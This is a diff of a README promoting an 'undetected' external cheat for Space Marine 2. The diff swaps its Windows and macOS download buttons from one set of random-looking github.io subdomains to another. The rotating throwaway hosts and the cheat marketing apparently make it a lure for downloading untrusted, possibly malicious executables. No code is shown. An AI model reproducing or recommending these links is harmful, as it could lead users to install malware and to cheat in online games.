@@ -1,9 +1,9 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://uvkayskoqsgd.github.io/windows-files/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://ApexShrimpJetty10.github.io/macos-install/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://ApexShrimpJetty10.github.io/macos-install/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://ApexShrimpJetty10.github.io/macos-install/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://izaalowypioz.github.io/win-runner/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://WoodSniperAtrium.github.io/macos-setup/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://WoodSniperAtrium.github.io/macos-setup/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://WoodSniperAtrium.github.io/macos-setup/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -82,11 +82,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://uvkayskoqsgd.github.io/windows-files/">
+  <a href="https://izaalowypioz.github.io/win-runner/">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://uvkayskoqsgd.github.io/windows-files/">
+  <a href="https://izaalowypioz.github.io/win-runner/">
     <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
   </a>
 </p>
